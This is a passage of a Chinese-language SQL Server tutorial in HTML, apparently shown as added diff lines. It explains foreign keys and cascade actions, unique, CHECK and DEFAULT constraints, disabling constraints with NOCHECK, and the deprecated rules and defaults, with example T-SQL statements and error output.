+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">customerId</span>    <span style="color:#58a1dd">int</span>             <span style="color:#ff636f">not</span> <span style="color:#ff636f">null</span>   <span style="color:#ff636f">foreign</span> <span style="color:#ff636f">key</span> <span style="color:#ff636f">references</span> <span style="color:#58a1dd">customer</span>(<span style="color:#58a1dd">customerId</span>)<span style="color:#828b96;font-style:italic">--约束类型-外键-引用表(列名)
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>);</span></span></code></pre></div><p>####### 4.2、在已存在的表中添加一个外键</p>
+<p>假设上面的代码去掉了添加外键行，那么可以书写代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">alter</span> <span style="color:#ff636f">table</span> <span style="color:#58a1dd">orders</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">add</span> <span style="color:#ff636f">constraint</span> <span style="color:#58a1dd">FK_Orders_CustomerId</span>        <span style="color:#828b96;font-style:italic">--添加约束 名称
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#ff636f">foreign</span> <span style="color:#ff636f">key</span> (<span style="color:#58a1dd">customerId</span>)   <span style="color:#ff636f">references</span> <span style="color:#58a1dd">customer</span>(<span style="color:#58a1dd">customerId</span>)    <span style="color:#828b96;font-style:italic">--外键约束，外键列名，被引用列名</span></span></span></code></pre></div><p>刚添加的约束和之前添加的约束一样生效，如果某行引用customerId不存在，那么就不允许把该行添加到Orders表中。</p>
+<p>####### 4.3、级联动作</p>
+<p>外键和其他类型键的一个重要区别是：外键是双向的，即不仅是限制子表的值必须存在于父表中，还在每次对父表操作后检查子行(这样避免了孤行)。SQL Server的默认行为是在子行存在时“限制”父行被删除。然而，有时会自动删除任何依赖的记录，而不是防止删除被引用的记录。同样在更新记录时，可能希望依赖的记录自动引用刚刚更新的记录。比较少见的情况是，你可能希望将引用行改变为某个已知的状态。为此，可以选择将依赖行的值设置为NULL或者那个列的默认值。</p>
+<p>这种进行自动删除和自动更新的过程称为级联。这种过程，特别是删除过程，可以经过几层的依赖关系(一条记录依赖于另一条记录，而这另一条记录又依赖其他记录)。</p>
+<p>在SQL Server中实现级联动作需要做的就是修改外键语法-只需要在添加前面加上ON子句。例如：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">alter</span> <span style="color:#ff636f">table</span> <span style="color:#58a1dd">orders</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">add</span> <span style="color:#ff636f">constraint</span> <span style="color:#58a1dd">FK_Orders_CustomerId</span>        <span style="color:#828b96;font-style:italic">--添加约束 名称
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>        <span style="color:#ff636f">foreign</span> <span style="color:#ff636f">key</span> (<span style="color:#58a1dd">customerId</span>)    <span style="color:#ff636f">references</span> <span style="color:#58a1dd">customer</span>(<span style="color:#58a1dd">customerId</span>)    <span style="color:#828b96;font-style:italic">--外键约束，外键列名，被引用列名
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>        <span style="color:#ff636f">on</span> <span style="color:#ff636f">update</span>     <span style="color:#ff636f">no</span> <span style="color:#58a1dd">action</span>    <span style="color:#828b96;font-style:italic">--默认修改时不级联更新子表
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>        <span style="color:#ff636f">on</span> <span style="color:#ff636f">delete</span>     <span style="color:#ff636f">cascade</span>      <span style="color:#828b96;font-style:italic">--删除时级联删除依赖行</span></span></span></code></pre></div><p>当在进行级联删除时，如果一个表级联了另一个表，而另一个表又级联了其他表，这种级联会一直下去，不受限制，这其实是级联的一个危险之处，很容易一个不小心删掉大量数据。</p>
+<p>级联动作除了no action，cascade之外，还有set null和set default。后两个是在SQL Server2005中引入的，如果要兼容到SQL Server2000的话，要避免使用这两个级联动作。但是他们的才做是非常简单的：如果执行更新而改变了一个父行的值，那么子行的值将被设置为NULL，或者设置为该列的默认值(不管SET NULL还是SET DEFAULT)。</p>
+<h6 id="五唯一约束" class="heading-element"><span>0.0.0.1.7  五、唯一约束</span>
+  <a href="#%e4%ba%94%e5%94%af%e4%b8%80%e7%ba%a6%e6%9d%9f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>唯一约束与主键比较相似，共同点在于它们都要求表中指定的列(或者列的组合)上有一个唯一值，区别是唯一约束没有被看作表中记录的唯一标识符(即使你可以按这样的方式使用也有效)，而且==可以有多个唯一约束==(而在每个表中只能有一个主键)。</p>
+<p>一旦建立了唯一约束，那么==指定列中的每个值必须是唯一的==。如果更新或者插入一条记录在带唯一约束的列上有已经存在的值的记录，SQL Server将抛出错误，拒绝这个记录。</p>
+<p>和主键不同，唯一约束不会自动防止设置一个NULL值，是否允许为NULL由表中相应列的NULL选项的设置决定，但即使确实允许NULL值，一张表中也只能够插入一个NULL值(如果允许多个，那就不叫唯一了)。</p>
+<p>在已存在的表上创建唯一约束：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">alter</span> <span style="color:#ff636f">table</span> <span style="color:#58a1dd">Account</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">add</span> <span style="color:#ff636f">constraint</span> <span style="color:#58a1dd">AK_AccountName</span>    <span style="color:#828b96;font-style:italic">--约束名
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#ff636f">unique</span> (<span style="color:#58a1dd">Account_Name</span>)    <span style="color:#828b96;font-style:italic">-- 列名</span></span></span></code></pre></div><p>AK代表替换键(Alternate Key)，唯一约束也叫替换键。</p>
+<p>####### 主键和唯一约束的区别：</p>
+<ul>
+<li>主键约束不允许出现NULL值。任何索引的索引键都不允许包含null值。但唯一约束允许包含NULL值，但唯一约束把两个NULL值当作重复值，所以施加了唯一约束的每一列只允许包含一个NULL值。</li>
+<li>创建主键时会自动创建聚集索引，除非当前表中已经含有了聚集索引或是创建主键时指定了NONCLUSTERED关键字。</li>
+<li>创建唯一约束时会自动创建非聚集索引，除非你指定了CLUSTERED关键字并且当前表中还没有聚集索引。</li>
+<li>每个表中只能有一个主键，但可以由多个唯一约束。</li>
+</ul>
+<h6 id="六check约束" class="heading-element"><span>0.0.0.1.8  六、CHECK约束</span>
+  <a href="#%e5%85%adcheck%e7%ba%a6%e6%9d%9f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>CHECK约束约束可以和一个列关联，也可以和一个表关联，因为它们可以检查一个列的值相对于另外一个列的值，只要这些列都在同一个表中以及值是在更新或者插入的同一行中。CHECK约束还可以用于检查列值组合是否满足某一个标准。</p>
+<p>可以像使用where子句一样的规则来定义CHECK约束。CHECK约束条件的示例如下：</p>
+<ul>
+<li>限制Month列为合适的数字：BETWEEN 1 AND 12</li>
+<li>正确的SSN格式：LIKE&rsquo;[0-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]'</li>
+<li>限制为一个快递公司的特定列表：IN(&lsquo;UPS&rsquo;,&lsquo;Fed Ex&rsquo;,EMS&rsquo;)</li>
+<li>价格必须为正数：UnitPrice &gt;= 0</li>
+<li>引用同一行中的另外一列：ShipDate &gt;= OrderDate</li>
+</ul>
+<p>上面给出的列表只是一小部分，而条件实际上市无限多的。几乎所有可以放到where子句的条件都可以放到该约束中。而且和其他选择(规则和触发器)相比，CHECK约束执行速度更快。</p>
+<p>在已存在的表中添加一个CHECK约束：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">alter</span> <span style="color:#ff636f">table</span> <span style="color:#58a1dd">Account</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">add</span> <span style="color:#ff636f">constraint</span> <span style="color:#58a1dd">CN_AccountAge</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">check</span>  (<span style="color:#58a1dd">Account_Age</span> <span style="color:#ff636f">&gt;</span> <span style="color:#a6be9d">18</span>);    <span style="color:#828b96;font-style:italic">-- 插入年龄必须大于18</span></span></span></code></pre></div><p>如果此时视图添加一条不满足的记录，将报如下错误：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">insert</span> <span style="color:#ff636f">into</span> <span style="color:#58a1dd">Account</span> <span style="color:#ff636f">values</span> (<span style="color:#a6be9d">22</span>,<span style="color:#a6be9d">&#39;洪&#39;</span>,<span style="color:#a6be9d">17</span>)
+</span></span><span style="display:flex;"><span>消息 <span style="color:#a6be9d">547</span>，级别 <span style="color:#a6be9d">16</span>，状态 <span style="color:#a6be9d">0</span>，第 <span style="color:#a6be9d">1</span> 行
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">INSERT</span> 语句与 <span style="color:#ff636f">CHECK</span> 约束<span style="color:#a6be9d">&#34;CN_AccountAge&#34;</span>冲突。该冲突发生于数据库<span style="color:#a6be9d">&#34;Nx&#34;</span>，表<span style="color:#a6be9d">&#34;dbo.Account&#34;</span>, <span style="color:#ff636f">column</span> <span style="color:#a6be9d">&#39;Account_Age&#39;</span>。
+</span></span><span style="display:flex;"><span>语句已终止。</span></span></code></pre></div><h6 id="七default约束" class="heading-element"><span>0.0.0.1.9  七、DEFAULT约束</span>
+  <a href="#%e4%b8%83default%e7%ba%a6%e6%9d%9f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>和所有约束一样，DEFAULT约束也是表定义的一个组成部分，它定义了当插入的新行对于定义了默认约束的列未提供相应数据时该怎么办。可以定义它为一个字面值(例如，设置默认薪水为0，或者设置字符串列为&quot;UNKNOWN&quot;)，或者某个系统值(getdate())。</p>
+<p>对于DEFAULT约束，要了解以下几个特性：</p>
+<p>1、默认值只在insert语句中使用。在update语句和delete语句中被忽略。</p>
+<p>2、如果在insert语句中提供了任意值，那就不使用默认值。</p>
+<p>3、如果没有提供值，那么总是使用默认值。</p>
+<p>值得注意的是，update命令的规则有一个例外，如果显示说明使用默认值就是例外。可以通过使用关键字DEFAULT表示更新的值设置为默认值。</p>
+<p>####### 7.1在创建表时定义DEFAULT约束：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">create</span> <span style="color:#ff636f">table</span> <span style="color:#58a1dd">person</span>
+</span></span><span style="display:flex;"><span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">person_id</span> <span style="color:#58a1dd">int</span> <span style="color:#ff636f">identity</span> <span style="color:#ff636f">not</span> <span style="color:#ff636f">null</span>  <span style="color:#ff636f">primary</span> <span style="color:#ff636f">key</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">person_name</span> <span style="color:#58a1dd">nvarchar</span>(<span style="color:#a6be9d">30</span>) <span style="color:#ff636f">not</span> <span style="color:#ff636f">null</span>   <span style="color:#ff636f">default</span> <span style="color:#a6be9d">&#39;无名氏&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">person_age</span> <span style="color:#58a1dd">int</span> <span style="color:#ff636f">not</span> <span style="color:#ff636f">null</span>
+</span></span><span style="display:flex;"><span>)</span></span></code></pre></div><p>在执行语句后：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">insert</span> <span style="color:#ff636f">into</span> <span style="color:#58a1dd">person</span> (<span style="color:#58a1dd">person_age</span>) <span style="color:#ff636f">values</span>(<span style="color:#a6be9d">24</span>)</span></span></code></pre></div><p>表中被插入一条记录如下：</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309281600960.webp" alt="image-20230928160054367" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309281600960.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309281600960.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309281600960.webp?size=large 2x" data-title="image-20230928160054367" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>####### 7.2在已存在的表上添加DEFAULT约束：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">alter</span> <span style="color:#ff636f">table</span> <span style="color:#58a1dd">person</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">add</span> <span style="color:#ff636f">constraint</span> <span style="color:#58a1dd">CN_DefaultName</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">default</span>    <span style="color:#a6be9d">&#39;无名氏&#39;</span>  <span style="color:#ff636f">for</span> <span style="color:#58a1dd">person_name</span></span></span></code></pre></div><h6 id="八禁用约束" class="heading-element"><span>0.0.0.1.10  八、禁用约束</span>
+  <a href="#%e5%85%ab%e7%a6%81%e7%94%a8%e7%ba%a6%e6%9d%9f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>有时我们想暂时或永久地消除约束。但是SQL Server并没有提供删除约束的方法。SQL Server只允许禁用外键约束或CHECK约束，而同时保持约束的完整性。</p>
+<p>禁用一个数据完整性规则通常是因为已经有无效数据了。这样的数据通常分为以下两类：</p>
+<p>1、在创建约束时已经在数据库中的数据</p>
+<p>2、在约束创建以后希望添加的数据</p>
+<p>SQL Server允许禁用完整性检查一段时间来对例外的无效数据作处理，然后再重新启用完整性(不是物理删除数据完整性约束)。</p>
+<p>注意：不能禁用主键约束或者唯一约束</p>
+<p>####### 8.1、在创建约束时，忽略检查之前的不满足数据</p>
+<p>要添加一个约束，但是有不应用到已存在的数据中，可以再执行Alter Table语句添加约束时使用WITH NOCHECK选项。</p>
+<p>按照上面创建Check约束的方法，已经Alter Table时，表中本身已经存在不符合的数据，那么Alter Table操作将被SQL Server拒绝执行。除非已经存在的所有数据都满足CHECK约束的条件，否则SQL Server不会执行创建约束的命令。要解决这个问题，我们可以添加WITH NOCHECK。</p>
+<p>我们先新建一个表只有3个字段的表，Id、姓名、年龄，并在里面插入一条不满足要求的数据：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">insert</span> <span style="color:#ff636f">into</span> <span style="color:#58a1dd">Account</span> <span style="color:#ff636f">values</span> (<span style="color:#a6be9d">23</span>,<span style="color:#a6be9d">&#39;洪&#39;</span>,<span style="color:#a6be9d">17</span>)</span></span></code></pre></div><p>然后执行添加约束命令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">alter</span> <span style="color:#ff636f">table</span> <span style="color:#58a1dd">Account</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">add</span> <span style="color:#ff636f">constraint</span> <span style="color:#58a1dd">CN_AccountAge18</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">check</span> (<span style="color:#58a1dd">Account_Age</span> <span style="color:#ff636f">&gt;</span> <span style="color:#a6be9d">18</span>);    <span style="color:#828b96;font-style:italic">-- 插入年龄必须大于18</span></span></span></code></pre></div><p>SQL Server报一下错误：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>消息 <span style="color:#a6be9d">547</span>，级别 <span style="color:#a6be9d">16</span>，状态 <span style="color:#a6be9d">0</span>，第 <span style="color:#a6be9d">1</span> 行
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">ALTER</span> <span style="color:#ff636f">TABLE</span> 语句与 <span style="color:#ff636f">CHECK</span> 约束<span style="color:#a6be9d">&#34;CN_AccountAge18&#34;</span>冲突。该冲突发生于数据库<span style="color:#a6be9d">&#34;Nx&#34;</span>，表<span style="color:#a6be9d">&#34;dbo.Account&#34;</span>, <span style="color:#ff636f">column</span> <span style="color:#a6be9d">&#39;Account_Age&#39;</span>。</span></span></code></pre></div><p>这时候我们换一种方式去执行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">alter</span> <span style="color:#ff636f">table</span> <span style="color:#58a1dd">Account</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">WITH</span> <span style="color:#58a1dd">NOCHECK</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">add</span> <span style="color:#ff636f">constraint</span> <span style="color:#58a1dd">CN_AccountAge18</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">check</span>  (<span style="color:#58a1dd">Account_Age</span> <span style="color:#ff636f">&gt;</span> <span style="color:#a6be9d">18</span>);    <span style="color:#828b96;font-style:italic">-- 插入年龄必须大于18</span></span></span></code></pre></div><p>以上代码就能够成功执行，并且只有以后添加的数据具备约束，之前添加的不符合条件的数据记录依然存在。</p>
+<p>####### 8.2、临时禁用已存在的约束</p>
+<p>当我们需要从另一数据库中导入数据到表中，而表中已建立了约束的时候，可能会存在一些数据和规则不匹配。当然有一个解决方式是先删除约束，添加需要的数据，然后WITH NOCHECK再添加回去。但是这样做太麻烦了。我们不需要这么做。我们可以采用名为NOCHECK的选项来运行ALTER语句，这样就能够取消需要的约束。</p>
+<p>先来看看上节中创建的这个约束：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">alter</span> <span style="color:#ff636f">table</span> <span style="color:#58a1dd">Account</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">add</span> <span style="color:#ff636f">constraint</span> <span style="color:#58a1dd">CN_AccountAge18</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">check</span>   (<span style="color:#58a1dd">Account_Age</span> <span style="color:#ff636f">&gt;</span> <span style="color:#a6be9d">18</span>);    <span style="color:#828b96;font-style:italic">-- 插入年龄必须大于18</span></span></span></code></pre></div><p>要取消以上约束可以这样来：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">Alter</span> <span style="color:#ff636f">Table</span> <span style="color:#58a1dd">Account</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">NOCHECK</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">constraint</span> <span style="color:#58a1dd">CN_AccountAge18</span></span></span></code></pre></div><p>执行命令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">insert</span> <span style="color:#ff636f">into</span> <span style="color:#58a1dd">Account</span> <span style="color:#ff636f">values</span> (<span style="color:#a6be9d">25</span>,<span style="color:#a6be9d">&#39;取消了约束&#39;</span>,<span style="color:#a6be9d">17</span>)</span></span></code></pre></div><p>执行成功，成功添加了一行数据。</p>
+<p>留意到又能够向表中插入格式不匹配的数据了。</p>
+<p>这里要说明下，如何知道一个约束是否是启用还是禁用呢？sp_helpconstraint命令，当我们执行sp_helpconstraint的时候，会有一列status_enabled显示该约束的启用状态：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#58a1dd">sp_helpconstraint</span> <span style="color:#58a1dd">Account</span></span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309281601215.webp" alt="image-20230928160121087" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309281601215.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309281601215.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309281601215.webp?size=large 2x" data-title="image-20230928160121087" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>留意到status_enabled列为Disabled说明是禁用的意思。</p>
+<p>当要启用约束时，只需要用将语句中的NO CHECK替换为CHECK就可以了：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">Alter</span> <span style="color:#ff636f">Table</span> <span style="color:#58a1dd">Account</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">CHECK</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">constraint</span> <span style="color:#58a1dd">CN_AccountAge18</span></span></span></code></pre></div><p>执行之后，约束又启用了：再来sp_helpconstraint看下：</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309281601152.webp" alt="image-20230928160143007" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309281601152.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309281601152.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309281601152.webp?size=large 2x" data-title="image-20230928160143007" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>留意到status_enabled列变成了Enabled。</p>
+<p>status_enabled的两种状态如下：</p>
+<p>Enabled:启用；</p>
+<p>Disabled:禁用；</p>
+<h6 id="九规则和默认值已淘汰" class="heading-element"><span>0.0.0.1.11  九、规则和默认值（已淘汰）</span>
+  <a href="#%e4%b9%9d%e8%a7%84%e5%88%99%e5%92%8c%e9%bb%98%e8%ae%a4%e5%80%bc%e5%b7%b2%e6%b7%98%e6%b1%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>规则和默认值的应用要早于CHECK和DEFAULT约束。他们是较老的SQL Server备用约束的一部分，当然也不是没有优点。</p>
+<p>自7.0版本之后，MicroSoft指出规则和默认值只是为了向后兼容，而不准备在以后继续支持这个特性。因此对于生成新代码时，应该使用约束。</p>
+<p>规则、默认值与约束的本质区别是：约束是一个表的特征，本身没有存在形式，而规则和默认值是表和自身的实际对象，本身存在。约束是在表定义中定义的，而规则和默认值是单独定义，然后&quot;绑定到&quot;表上。</p>
+<p>规则和默认值的独立对象特性使得它们可以在重用时不用重新定义。实际上，规则和默认值不限于被绑定到表上，它们也可以绑定到数据类型上。</p>
+<p>####### 9.1、规则</p>
+<p>规则和CHECK约束非常相似。它们之间的唯一区别是规则每次只能作用于一个列。可以将同一规则分别绑定到一个表中的多个列，但是规则分别作用于每个列，根本不会意识到其他列的存在。像QtyShipped</p>
+<p>&lt;= QtyOrdered这样的约束不适用于规则(它引用多个列)，而LIKE([0-9][0-9][0-9])这样的定义适用于规则。</p>
+<p><strong>定义规则：</strong></p>
+<p>下面定义一个规则，这样就可以首先看到区别所在：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">CREATE</span> <span style="color:#ff636f">RULE</span> <span style="color:#58a1dd">Age18Rule</span>
